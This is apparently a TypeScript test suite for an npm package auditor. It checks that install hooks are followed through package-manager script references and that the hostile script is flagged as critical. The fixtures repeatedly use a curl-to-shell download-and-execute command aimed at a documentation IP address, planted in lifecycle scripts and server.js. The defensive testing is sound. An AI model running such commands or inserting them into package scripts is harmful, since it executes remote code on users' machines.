import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// A lifecycle hook that hands a script name to a package manager is followed into `scripts[<name>]`.
// Following is deliberately generous: a defined script named anywhere after npm/pnpm/yarn/bun is scanned.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson: object): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const findings = (scripts: Record<string, string>, files: Record<string, string> = {}) =>
  runRules(inputFor(files, { scripts })).filter((x) => x.ruleId === "install-scripts");
const sev = (scripts: Record<string, string>, files: Record<string, string> = {}) => findings(scripts, files).map((x) => x.severity);

// `setup` runs an inline payload (no setup.js file, so only script lookup can find it).
const via = (hook: string, extra: Record<string, string> = {}) => sev({ postinstall: hook, setup: CURL_SH, ...extra });

describe("install hooks follow package-manager script references", () => {
  const forms: [string, string][] = [
    ["npm run", "npm run setup"],
    ["pnpm run", "pnpm run setup"],
    ["yarn run", "yarn run setup"],
    ["yarn <name>", "yarn setup"],
    ["pnpm <name>", "pnpm setup"],
    ["bun run", "bun run setup"],
    ["bun <name>", "bun setup"],
    ["npm run -- x", "npm run -- setup"],
    ["npm --prefix . run x", "npm --prefix . run setup"],
    ["an unknown option before the name", "npm --made-up-flag run setup"],
    ["a name after other arguments", "npm run setup -- --flag"],
    ["a compound command", "echo hi && npm run setup"],
  ];
  for (const [label, hook] of forms) {
    test(`${label}: \`${hook}\` reaches the payload`, () => assert.deepEqual(via(hook), ["critical"]));
  }

  test("the evidence names the followed script", () => {
    const [f] = findings({ postinstall: "npm run setup", setup: CURL_SH });
    assert.equal(f!.severity, "critical");
    assert.ok(f!.evidence.some((e) => e.snippet.startsWith('"setup":')));
  });

  test("a file executed by the followed script is scanned", () => {
    assert.deepEqual(sev({ postinstall: "npm run setup", setup: "node setup.js" }, { "package/setup.js": `${CURL_SH}\n` }), ["critical"]);
  });

  test("`npm test`, `npm t` and `npm restart` (which also follows stop and start)", () => {
    assert.deepEqual(sev({ postinstall: "npm test", test: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm t", test: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm restart", start: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm restart", stop: CURL_SH }), ["critical"]);
  });

  test("pre<name> and post<name> run with the script, and a benign prebuild stays clean", () => {
    assert.deepEqual(sev({ postinstall: "npm run build", build: "tsc", prebuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm run build", build: "tsc", postbuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm run build", build: "tsc", prebuild: "echo clean" }), ["low"]);
    assert.deepEqual(sev({ postinstall: "npm run build", build: "tsc", preother: CURL_SH }), ["low"]);
  });

  test("a benign `build` stays clean, and `yarn install` with no `install` script resolves nothing", () => {
    assert.deepEqual(sev({ postinstall: "npm run build", build: "tsc" }), ["low"]);
    assert.deepEqual(sev({ postinstall: "yarn install", setup: CURL_SH }), ["low"]);
    assert.deepEqual(sev({ postinstall: "npm run setup" }), ["low"]);
  });

  test("words that are not package scripts or follow another command are not followed", () => {
    assert.deepEqual(via("echo setup"), ["low"]);
    assert.deepEqual(via("npm run constructor"), ["low"]);
    assert.deepEqual(via("yarn toString"), ["low"]);
  });

  test("an alias keeps its literal name: `npm run t` follows scripts.t", () => {
    assert.deepEqual(sev({ postinstall: "npm run t", t: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm t", t: CURL_SH }), ["critical"]);
  });

  test("pre/post are followed whether or not the main script is defined", () => {
    assert.deepEqual(sev({ postinstall: "npm run build", prebuild: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm test", pretest: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm t", posttest: CURL_SH }), ["critical"]); // alias target gets pre/post too
  });

  test("implicit `npm start` runs server.js when scripts.start is undefined", () => {
    assert.deepEqual(sev({ postinstall: "npm start" }, { "package/server.js": `${CURL_SH}\n` }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm restart" }, { "package/server.js": `${CURL_SH}\n` }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm start", prestart: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm start", start: "echo hi" }, { "package/server.js": `${CURL_SH}\n` }), ["low"]); // an explicit start wins
    assert.deepEqual(sev({ postinstall: "npm run build" }, { "package/server.js": `${CURL_SH}\n` }), ["low"]);
  });

  test("a command that runs several scripts follows each, and inherited keys are not aliases", () => {
    const hooks: [string, string][] = [
      ["npm cit", "test"], ["npm install-ci-test", "test"],
      ["npm pack", "prepack"], ["npm pack", "prepare"], ["npm pack", "postpack"],
      ["npm publish", "prepublishOnly"], ["npm publish", "postpublish"], ["npm publish", "publish"],
      ["npm version", "preversion"], ["npm version", "postversion"],
      ["npm ci", "prepare"], ["npm i", "postinstall"], ["npm rebuild", "install"],
    ];
    for (const [hook, target] of hooks) {
      assert.deepEqual(sev({ preinstall: hook, [target]: CURL_SH }).includes("critical"), true, `${hook} -> ${target}`);
    }
    assert.deepEqual(sev({ postinstall: "npm run constructor" }), ["low"]);
    assert.deepEqual(sev({ postinstall: "npm run __proto__" }), ["low"]);
  });

  test("an empty `start` script does not suppress the server.js fallback", () => {
    assert.deepEqual(sev({ postinstall: "npm start", start: "" }, { "package/server.js": `${CURL_SH}\n` }), ["critical"]);
  });

  test("`cit`, the install aliases, `verison` and an unknown subcommand reach their lifecycle scripts", () => {
    for (const hook of ["npm cit", "npm install-ci-test", "npm add left-pad", "npm isntall", "npm frobnicate", "npm run setup"]) {
      assert.deepEqual(sev({ postinstall: hook, prepare: CURL_SH }), ["critical"], `${hook} -> prepare`);
    }
    assert.deepEqual(sev({ postinstall: "npm verison", postversion: CURL_SH }), ["critical"]);
    assert.deepEqual(sev({ postinstall: "npm cit", test: CURL_SH }), ["critical"]);
  });

  test("a self-referencing script terminates", () => {
    assert.deepEqual(sev({ postinstall: "npm run a", a: "npm run a" }), ["low"]);
    assert.deepEqual(sev({ postinstall: "npm run a", a: "npm run b", b: `npm run a && ${CURL_SH}` }), ["critical"]);
  });

  test("a 20,000-script chain finishes quickly with no stack overflow", () => {
    const scripts: Record<string, string> = { postinstall: "npm run s0" };
    for (let i = 0; i < 20000; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
    scripts.s20000 = CURL_SH;
    const t0 = Date.now();
    assert.deepEqual(sev(scripts), ["critical"]);
    assert.ok(Date.now() - t0 < 2000);
  });
});
